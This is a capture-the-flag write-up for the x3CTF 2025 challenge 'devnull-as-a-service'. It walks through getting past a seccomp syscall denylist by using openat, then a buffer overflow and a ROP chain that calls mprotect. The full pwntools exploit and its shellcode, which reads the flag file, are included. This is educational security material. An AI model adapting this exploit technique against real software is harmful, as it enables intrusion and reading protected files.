## Level: Easy

### Challenge

is a challenge from 0x3CTF... the intro was pretty [sick](https://www.youtube.com/watch?v=1CpP3gfebGI)

main calls dev_null()

![devnul](https://github.com/4rsp/writeups/blob/main/x3CTF-2025/devnull-as-a-service/func.png)

and dev_null calls enable_seccomp()

![seccomp](https://github.com/4rsp/writeups/blob/main/x3CTF-2025/devnull-as-a-service/seccomp.png)

as you can tell from the name it enables seccomp. 

the output of `seccomp-tools dump ./dev-null`

```
[/dev/null as a service] Send us anything, we won't do anything with it.
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1c 0xc000003e  if (A != ARCH_X86_64) goto 0030
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x19 0xffffffff  if (A != 0xffffffff) goto 0030
 0005: 0x15 0x18 0x00 0x00000002  if (A == open) goto 0030
 0006: 0x15 0x17 0x00 0x00000003  if (A == close) goto 0030
 0007: 0x15 0x16 0x00 0x00000012  if (A == pwrite64) goto 0030
 0008: 0x15 0x15 0x00 0x00000014  if (A == writev) goto 0030
 0009: 0x15 0x14 0x00 0x00000016  if (A == pipe) goto 0030
 0010: 0x15 0x13 0x00 0x00000020  if (A == dup) goto 0030
 0011: 0x15 0x12 0x00 0x00000021  if (A == dup2) goto 0030
 0012: 0x15 0x11 0x00 0x00000028  if (A == sendfile) goto 0030
 0013: 0x15 0x10 0x00 0x00000029  if (A == socket) goto 0030
 0014: 0x15 0x0f 0x00 0x0000002c  if (A == sendto) goto 0030
 0015: 0x15 0x0e 0x00 0x0000002e  if (A == sendmsg) goto 0030
 0016: 0x15 0x0d 0x00 0x00000031  if (A == bind) goto 0030
 0017: 0x15 0x0c 0x00 0x00000038  if (A == clone) goto 0030
 0018: 0x15 0x0b 0x00 0x00000039  if (A == fork) goto 0030
 0019: 0x15 0x0a 0x00 0x0000003a  if (A == vfork) goto 0030
 0020: 0x15 0x09 0x00 0x0000003b  if (A == execve) goto 0030
 0021: 0x15 0x08 0x00 0x00000065  if (A == ptrace) goto 0030
 0022: 0x15 0x07 0x00 0x00000113  if (A == splice) goto 0030
 0023: 0x15 0x06 0x00 0x00000114  if (A == tee) goto 0030
 0024: 0x15 0x05 0x00 0x00000124  if (A == dup3) goto 0030
 0025: 0x15 0x04 0x00 0x00000125  if (A == pipe2) goto 0030
 0026: 0x15 0x03 0x00 0x00000128  if (A == pwritev) goto 0030
 0027: 0x15 0x02 0x00 0x00000137  if (A == process_vm_writev) goto 0030
 0028: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0030: 0x06 0x00 0x00 0x00000000  return KILL
```
> looks like a very strict syscall filter. gosh, if i only knew kernel hacking...

read and write is allowed but open is not

but ya know, there is also openat syscall which they didn't include in the filter...

binary is statically linked so no libc shenanigans 😞

there is simple bof in the dev_null function (never ignore compiler warnings...) which we can use it to call mprotect on an address via gadgets from the binary (no PIE)

then read in your shellcode to the addr with fixed permissions and jump to it

thats pretty much it...

```python3
#!/usr/bin/env python3

from pwn import *
context.arch = 'amd64'
'''
p = gdb.debug("./dev_null", gdbscript="""
              b *dev_null+23
              b *dev_null+50
              b *0x00000000004b0000
              c
""")
'''
p = remote("152abf23-094a-42db-ab67-a6e4df33e392.x3c.tf", 31337, ssl=True)

gets = 0x405a20
puts = 0x405c10
main = 0x401e72

pop_rax = 0x000000000042193c 
pop_rsi = 0x0000000000402acc # +pop rbp
pop_rdi = 0x0000000000413795
pop_rbx = 0x0000000000474967
pop_rdx = 0x000000000046ddce # +pop rbx, r12, r13, rbp

syscall = 0x000000000041aaf4 # mov eax, 0xa; syscall
nop = 0x000000000042210f 

# call mprotect with rwx permissions
payload = p64(pop_rsi)
payload += p64(0x600)
payload += p64(main)

payload += p64(pop_rdx)
payload += p64(0x07)
payload += p64(0x00) * 3
payload += p64(main)

payload += p64(pop_rdi)
payload += p64(0x00000000004b0000)
payload += p64(pop_rax)
payload += p64(0x00) 
payload += p64(syscall)
payload += p64(main)

p.sendlineafter(b"with it.\n", b"a"*16 + payload)

# write and jump to the shellcode
jmp_rax = 0x0000000000407677 # +pop rbp; jmp

payload = p64(pop_rdi)
payload += p64(0x00000000004b0000)
payload += p64(gets)

payload += p64(pop_rax)
payload += p64(0x00000000004b0008)
payload += p64(jmp_rax)

p.sendlineafter(b"with it.\n", b"a"*16 + payload)

# openat, read and write 
asm_code = '''
    nop
    nop
    nop
    sub rsp, 0x20
    mov rdi, 0
    lea rsi, [rip+flag]
    mov rax, 0x101   
    xor rdx, rdx
    xor r10, r10
    syscall
    
    mov rdi, rax
    lea rsi, [buf+rip]
    mov rdx, 0x256
    xor rax, rax
    syscall

    xor rax, rax         
    mov al, 0x1           
    mov rdi, 1              
    lea rsi, [rip+buf]   
    mov rdx, 64             
    syscall                   

flag:
    .string "/home/ctf/flag.txt"

buf:
    .space 256

'''

p.sendline(asm(asm_code))

p.interactive()
```

and the very alive flag...

![remoteflag](https://github.com/4rsp/writeups/blob/main/x3CTF-2025/devnull-as-a-service/remoteflag.png)


***4rsp has started solving challs on remote, finally...***

